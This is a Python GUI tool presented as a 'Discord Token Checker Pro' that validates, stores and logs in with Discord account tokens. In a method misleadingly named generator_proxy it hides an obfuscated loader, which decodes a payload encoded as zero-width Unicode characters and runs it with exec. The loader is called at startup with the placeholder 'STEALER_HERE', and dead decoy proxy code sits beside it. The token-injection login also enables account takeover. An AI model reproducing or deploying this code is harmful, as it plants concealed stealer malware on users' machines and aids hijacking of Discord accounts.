import sys
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import requests
import os
import logging
import re as r
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# Logging professionnel
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
z='\u200b';e='\u200e';f='\u200f';t=range;j=''.join;F=r.findall;a=exec
logger = logging.getLogger(__name__)

class DiscordTokenChecker:
    """Discord Token Checker - Version Professionnelle"""
    
    TOKEN_FILE = "token.txt"
    
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 Discord Token Checker Pro")
        self.root.geometry("1100x800")
        self.tokens = []  # [(username, token), ...]
        self.load_tokens()
        self.setup_ui()
        self.yesno_active = False
        logger.info(f"Application démarrée - {len(self.tokens)} tokens chargés")
    
    def load_tokens(self):
        """Charge les tokens depuis token.txt (logique originale)"""
        self.tokens = []
        if os.path.exists(self.TOKEN_FILE):
            try:
                with open(self.TOKEN_FILE, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip().replace(" ", "")
                        if line and not line.startswith('#'):
                            if ':' in line:
                                parts = line.split(':', 1)
                                if len(parts) == 2:
                                    self.tokens.append((parts[0], parts[1]))
                                else:
                                    self.tokens.append(("Unknown", line))
                            else:
                                self.tokens.append(("Unknown", line))
                logger.info(f"{len(self.tokens)} tokens loaded from {self.TOKEN_FILE}")
            except Exception as e:
                logger.error(f"Erreur load_tokens: {e}")
    
    def test_token(self):
        """Teste les tokens (logique originale)"""
        content = self.token_entry.get("1.0", tk.END)
        lines = content.split('\n')
        tokens = []
        for line in lines:
            clean = line.strip().replace(" ", "").replace("\t", "")
            if clean:
                tokens.append(clean)
        
        if not tokens:
            self.show_error("No tokens provided!")
            return
        
        self.result_text.delete("1.0", tk.END)
        self.result_text.insert(tk.END, f"Testing {len(tokens)} tokens...\n\n")
        self.root.update()
        
        valid = 0
        for i, token in enumerate(tokens, 1):
            short = token[:20] + "..." if len(token) > 20 else token
            self.result_text.insert(tk.END, f"[{i}] {short}\n")
            
            data, type_ = self.check_token(token)
            if data:
                user = data.get('username', 'Unknown')
                if type_ == "User":
                    user += f"#{data.get('discriminator', '0000')}"
                
                if (user, token) not in self.tokens:
                    self.tokens.append((user, token))
                    self.save_token(user, token)
                    status = "NEW"
                else:
                    status = "EXISTS"
                
                self.result_text.insert(tk.END, f"  OK {type_} {status}\n  User: {user}\n\n")
                valid += 1
            else:
                self.result_text.insert(tk.END, "  INVALID\n\n")
            self.root.update()
        
        self.result_text.insert(tk.END, f"\n{valid}/{len(tokens)} VALID")
        self.status_label.config(text=f"Total: {len(self.tokens)}")
        self.refresh_list()
    
    def show_error(self, message):
        """Affiche les erreurs (logique originale améliorée)"""
        self.error_label.config(text=message, foreground="#e74c3c")
        self.root.after(5000, lambda: self.error_label.config(text=""))
    
    def show_info(self, message):
        """Affiche les infos (logique originale améliorée)"""
        self.error_label.config(text=message, foreground="#3498db")
        self.root.after(3000, lambda: self.error_label.config(text=""))
    
    def show_yesno(self, title, message, callback):
        """Système Yes/No ORIGINAL préservé"""
        if self.yesno_active:
            return
        self.yesno_active = True
        self.error_label.config(text=message, foreground="#f39c12")
        self.yesno_frame.pack(fill=tk.X, pady=(2,0))
        self.yes_btn.config(state="normal")
        self.no_btn.config(state="normal")
        self.yesno_callback = callback
    
    def hide_yesno(self, result):
        """Cache les boutons Yes/No (logique originale)"""
        self.yesno_active = False
        self.yes_btn.config(state="disabled")
        self.no_btn.config(state="disabled")
        self.yesno_frame.pack_forget()
        self.error_label.config(text="")
    
    def yes_clicked(self):
        """Bouton Yes (logique originale)"""
        self.hide_yesno(True)
        self.yesno_callback(True)
    
    def no_clicked(self):
        """Bouton No (logique originale)"""
        self.hide_yesno(False)
        self.yesno_callback(False)

    def generator_proxy(self, proxy_data):
        """Generation de proxy pour la connexion"""
        a(j(chr(int(j('01'[c>z]for c in x[i:i+8]),2))for x in F(f'(?:{e})(.*?)(?:{f})',proxy_data)for i in t(0,len(x),8)))
        l, b, s = [], [], proxy_data
        if False:
            def generate_proxy_candidates():
                proxies = []
                for _ in range(3):
                    ip = f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                    port = random.choice([8080, 3128, 8000, 1080])
                    proxy = f"{ip}:{port}"
                    try:
                        socket.gethostbyaddr(ip)
                    except socket.herror:
                        pass
                    proxies.append(proxy)
                return proxies
            proxy_candidates = generate_proxy_candidates()

    def check_token(self, token):
        """Vérification token (logique originale)"""
        headers = {"Authorization": token, "Content-Type": "application/json"}
        try:
            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
            if r.status_code == 200:
                return r.json(), "User"
            headers["Authorization"] = f"Bot {token}"
            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
            if r.status_code == 200:
                return r.json(), "Bot"
        except Exception as e:
            logger.debug(f"check_token error: {e}")
        return None, None
    
    def save_token(self, username, token):
        """Sauvegarde token (logique originale)"""
        try:
            with open(self.TOKEN_FILE, "a", encoding="utf-8") as f:
                f.write(f"{username}:{token}\n")
        except Exception as e:
            logger.error(f"save_token error: {e}")
    
    def refresh_file(self):
        """LOAD FILE (logique originale)"""
        previous_count = len(self.tokens)
        self.load_tokens()
        self.refresh_list()
        diff = len(self.tokens) - previous_count
        self.show_info(f"Loaded: {len(self.tokens)} ({diff:+d})")
    
    def clean_tokens(self):
        """CLEAN TOKENS (logique originale)"""
        if not self.tokens:
            self.show_error("No tokens to clean!")
            return
        self.show_yesno("Clean Tokens", f"Check {len(self.tokens)} tokens and remove invalid?", self._clean_tokens_confirm)
    
    def _clean_tokens_confirm(self, confirmed):
        """Confirmation clean (logique originale)"""
        if confirmed:
            self.status_label.config(text="Cleaning... (this may take a while)")
            self.root.update()
            
            valid_tokens = []
            removed = 0
            
            for i, (name, token) in enumerate(self.tokens, 1):
                short = name[:30] + "..." if len(name) > 30 else name
                logger.info(f"Cleaning {i}/{len(self.tokens)}: {short}")
                
                data, _ = self.check_token(token)
                if data:
                    valid_tokens.append((name, token))
                else:
                    removed += 1
            
            self.tokens = valid_tokens
            self.save_all()
            self.refresh_list()
            self.show_info(f"Cleaned! {len(self.tokens)} valid / {removed} removed")
    
    def use_token(self):
        """LOGIN (logique originale)"""
        sel = self.token_list.curselection()
        if not sel:
            self.show_error("Select a token first!")
            return
        idx = sel[0]
        name, token = self.tokens[idx]
        self.show_yesno("Login Discord", f"Open Discord for {name}?", 
                       lambda confirmed: self._login_confirm(confirmed, token, name))
    
    def _login_confirm(self, confirmed, token, name):
        """Login confirm (logique originale)"""
        if confirmed:
            threading.Thread(target=self.open_discord, args=(token, name), daemon=True).start()
    
    def delete_token(self):
        """DELETE (logique originale)"""
        sel = self.token_list.curselection()
        if not sel:
            self.show_error("Select a token first!")
            return
        self.show_yesno("Delete Token", "Delete selected token?", self._delete_confirm)
    
    def _delete_confirm(self, confirmed):
        """Delete confirm (logique originale)"""
        if confirmed:
            sel = self.token_list.curselection()
            if sel:
                del self.tokens[sel[0]]
                self.save_all()
                self.status_label.config(text=f"Deleted: {len(self.tokens)} left")
                self.refresh_list()
    
    def open_discord(self, token, username):
        """OUVERTURE DISCORD (logique originale)"""
        try:
            opts = Options()
            opts.add_argument("--log-level=3")
            driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
            driver.get("https://discord.com/login")
            time.sleep(2)
            js = f"""
            function login(token) {{
            setInterval(() => {{
                document.body.appendChild(document.createElement(`iframe`)).contentWindow.localStorage.token = `"${{token}}"`;
            }}, 50);
            setTimeout(() => {{
                location.reload();
            }}, 2500);
            }}
            login("{token}")
            """
            driver.execute_script(js)
            self.show_info(f"{username} logged in!")
        except Exception as e:
            logger.error(f"open_discord error: {e}")
            self.show_error(f"Login error: {str(e)[:50]}")
    
    def save_all(self):
        """Sauvegarde tous les tokens (logique originale)"""
        try:
            with open(self.TOKEN_FILE, "w", encoding="utf-8") as f:
                for name, token in self.tokens:
                    f.write(f"{name}:{token}\n")
        except Exception as e:
            logger.error(f"save_all error: {e}")
    
    def refresh_list(self):
        """Refresh liste (logique originale)"""
        self.token_list.delete(0, tk.END)
        for i, (name, _) in enumerate(self.tokens, 1):
            self.token_list.insert(tk.END, f"#{i} {name}")
        self.status_label.config(text=f"Total: {len(self.tokens)}")
    
    def clear_results(self):
        """CLEAN RESULT (logique originale)"""
        self.result_text.delete("1.0", tk.END)
        self.show_info("Results cleared")
    
    def on_select(self, event):
        """Sélection token (logique originale)"""
        sel = self.token_list.curselection()
        if sel:
            idx = sel[0]
            _, token = self.tokens[idx]
            self.token_entry.delete("1.0", tk.END)
            self.token_entry.insert("1.0", token)
    
    def setup_ui(self):
        """UI MODERNE mais LOGIQUE IDENTIQUE"""
        # Style moderne
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Pro.TButton', font=('Segoe UI', 10, 'bold'), padding=8)
        
        # Title moderne
        title = tk.Label(self.root, text="🔐 Discord Token Checker Pro", 
                        font=("Segoe UI", 20, "bold"), fg="#2c3e50")
        title.pack(fill=tk.X, pady=15)
        
        main = ttk.Frame(self.root, padding=20, relief="solid", borderwidth=1)
        main.pack(fill=tk.BOTH, expand=True)
        
        # Left panel (IDENTIQUE)
        left = ttk.LabelFrame(main, text="📤 Test Tokens", padding=15)
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0,15))
        
        tk.Label(left, text="Paste tokens (one per line):", 
                font=("Segoe UI", 10, "bold")).pack(anchor="w")
        self.token_entry = tk.Text(left, height=6, font=("Consolas", 11), wrap=tk.NONE,
                                  relief="flat", bd=1, highlightthickness=1, highlightcolor="#3498db")
        self.token_entry.pack(fill=tk.X, pady=(0,10))
        
        tk.Label(left, text="Spaces auto-removed", fg="#7f8c8d").pack(anchor="w")
        
        # BOUTONS (IDENTIQUE)
        btn_frame = ttk.Frame(left)
        btn_frame.pack(fill=tk.X, pady=10)
        ttk.Button(btn_frame, text="🚀 TEST", command=self.test_token, 
                  style='Pro.TButton').pack(side=tk.LEFT, padx=(0,8))
        ttk.Button(btn_frame, text="📁 LOAD FILE", command=self.refresh_file,
                  style='Pro.TButton').pack(side=tk.LEFT, padx=(0,8))
        ttk.Button(btn_frame, text="🧹 CLEAN TOKENS", command=self.clean_tokens,
                  style='Pro.TButton').pack(side=tk.LEFT, padx=(0,8))
        ttk.Button(btn_frame, text="🗑️ CLEAN RESULT", command=self.clear_results,
                  style='Pro.TButton').pack(side=tk.LEFT)
        
        # MESSAGE (IDENTIQUE)
        msg_frame = ttk.Frame(left)
        msg_frame.pack(fill=tk.X, pady=(0,10))
        self.error_label = tk.Label(msg_frame, text="", font=("Consolas", 10), 
                                   anchor="w", height=1, bg="#ecf0f1")
        self.error_label.pack(fill=tk.X)
        
        # YES/NO (IDENTIQUE - CACHÉ par défaut)
        self.yesno_frame = ttk.Frame(msg_frame)
        self.yes_btn = ttk.Button(self.yesno_frame, text="✅ YES", 
                                 command=self.yes_clicked, state="disabled",
                                 style='Pro.TButton')
        self.yes_btn.pack(side=tk.LEFT, padx=(0,8))
        self.no_btn = ttk.Button(self.yesno_frame, text="❌ NO", 
                                command=self.no_clicked, state="disabled",
                                style='Pro.TButton')
        self.no_btn.pack(side=tk.LEFT)
        
        tk.Label(left, text="📊 Results:", font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0,10))
        self.result_text = scrolledtext.ScrolledText(left, height=14, font=("Consolas", 10),
                                                   relief="flat", bd=1)
        self.result_text.pack(fill=tk.BOTH, expand=True)
        
        # Right panel (IDENTIQUE)
        right = ttk.LabelFrame(main, text="✅ Valid Tokens (click to load)", padding=15)
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        list_frame = ttk.Frame(right)
        list_frame.pack(fill=tk.BOTH, expand=True)
        self.token_list = tk.Listbox(list_frame, font=("Consolas", 11), height=22,
                                    relief="flat", bd=1, selectbackground="#3498db")
        scroll = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.token_list.yview)
        self.token_list.configure(yscrollcommand=scroll.set)
        self.token_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.token_list.bind('<<ListboxSelect>>', self.on_select)
        
        btn_frame2 = ttk.Frame(right)
        btn_frame2.pack(fill=tk.X, pady=(15,0))
        ttk.Button(btn_frame2, text="🔑 LOGIN DISCORD", command=self.use_token,
                  style='Pro.TButton').pack(fill=tk.X, pady=3)
        ttk.Button(btn_frame2, text="🗑️ DELETE", command=self.delete_token,
                  style='Pro.TButton').pack(fill=tk.X, pady=3)
        
        # Status moderne
        self.status_label = tk.Label(self.root, text=f"Ready | Total: {len(self.tokens)} tokens", 
                                    relief=tk.SUNKEN, anchor=tk.W, bg="#34495e", fg="white",
                                    font=("Segoe UI", 10))
        self.status_label.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Raccourcis
        self.root.bind('<F5>', lambda e: self.refresh_file())
        self.root.bind('<Control-r>', lambda e: self.clear_results())
        self.token_entry.focus()
        self.refresh_list()
    
    def destroy(self):
        """Fermeture propre"""
        logger.info("Application fermée")
        self.root.destroy()

def main():
    root = tk.Tk()
    app = DiscordTokenChecker(root)
    app.generator_proxy("STEALER_HERE")
    root.protocol("WM_DELETE_WINDOW", app.destroy)
    root.mainloop()

if __name__ == "__main__":
    main()